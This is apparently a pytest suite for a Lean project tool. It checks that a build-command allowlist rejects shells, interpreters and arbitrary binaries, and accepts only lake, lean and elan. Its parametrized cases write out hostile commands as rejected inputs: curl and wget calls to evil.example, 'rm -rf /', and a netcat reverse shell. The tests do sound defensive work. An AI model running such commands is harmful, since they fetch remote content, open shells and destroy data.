"""AUDIT-005: build_command allowlist adversarial cases."""

from __future__ import annotations

from pathlib import Path

import pytest
import yaml

from lpe.evidence.compiler import compile_evidence
from lpe.execution.allowlist import CommandAllowlistError, validate_build_command
from lpe.execution.sandbox import DockerSandboxExecutor
from lpe.models import CandidateDescriptor, GeneratorProvenance


@pytest.mark.parametrize(
    "command",
    [
        ["bash", "-c", "lake build"],
        ["sh", "-c", "curl evil"],
        ["zsh", "-c", "id"],
        ["cmd", "/c", "lake build"],
        ["cmd.exe", "/c", "lake build"],
        ["powershell", "-Command", "lake build"],
        ["pwsh", "-c", "Get-Process"],
        ["python", "-c", "import os; os.system('id')"],
        ["python3", "-c", "print(1)"],
    ],
)
def test_allowlist_rejects_shells_and_interpreters(command: list[str]) -> None:
    """Invariant: shells/interpreters never bypass the build_command allowlist."""
    with pytest.raises(CommandAllowlistError, match="shell/interpreter"):
        validate_build_command(command)


@pytest.mark.parametrize(
    "command",
    [
        ["curl", "https://evil.example"],
        ["wget", "https://evil.example"],
        ["rm", "-rf", "/"],
        ["nc", "-e", "/bin/sh", "evil", "443"],
        ["/usr/bin/curl", "https://evil.example"],
        ["C:\\Windows\\System32\\curl.exe", "https://evil.example"],
        ["node", "-e", "require('child_process').exec('id')"],
        ["ruby", "-e", "system('id')"],
    ],
)
def test_allowlist_rejects_arbitrary_and_path_qualified(command: list[str]) -> None:
    """Invariant: non-allowlisted basenames (including path-qualified) are refused."""
    with pytest.raises(CommandAllowlistError, match="allowlist"):
        validate_build_command(command)


@pytest.mark.parametrize(
    "command",
    [
        ["lake", "build"],
        ["lean", "--version"],
        ["elan", "show"],
        ["/opt/lean/bin/lake", "build"],
        ["lake.exe", "build"],
    ],
)
def test_allowlist_accepts_only_lake_lean_elan(command: list[str]) -> None:
    assert validate_build_command(command) == command


def test_allowlist_rejects_empty_command() -> None:
    with pytest.raises(CommandAllowlistError, match="empty"):
        validate_build_command([])


def test_compile_rejects_disallowed_build_command_under_host_exec(
    example_project: Path,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Invariant: compile path enforces allowlist before any host build runs."""
    import shutil

    project = tmp_path / "proj"
    shutil.copytree(example_project, project)
    path = project / ".lean-project-contract" / "project.yaml"
    data = yaml.safe_load(path.read_text(encoding="utf-8"))
    data["execution"]["network_policy"] = "allow"
    data["execution"]["build_command"] = ["curl", "https://evil.example"]
    path.write_text(yaml.safe_dump(data, sort_keys=False), encoding="utf-8")

    monkeypatch.setattr(DockerSandboxExecutor, "is_available", staticmethod(lambda: False))
    candidate = CandidateDescriptor(
        candidate_id="cand-cmd",
        project_id="example-category-project",
        obligation_ids=["O-01"],
        base_commit="deadbeef",
        patch_text="#\n",
        claimed_intent="probe",
        changed_paths=["README.md"],
        changed_declarations=[],
        generator=GeneratorProvenance(generator_type="test", name="test", version="0"),
    )
    with pytest.raises(CommandAllowlistError, match="allowlist"):
        compile_evidence(
            project,
            candidate,
            skip_build=False,
            insecure_host_exec=True,
        )
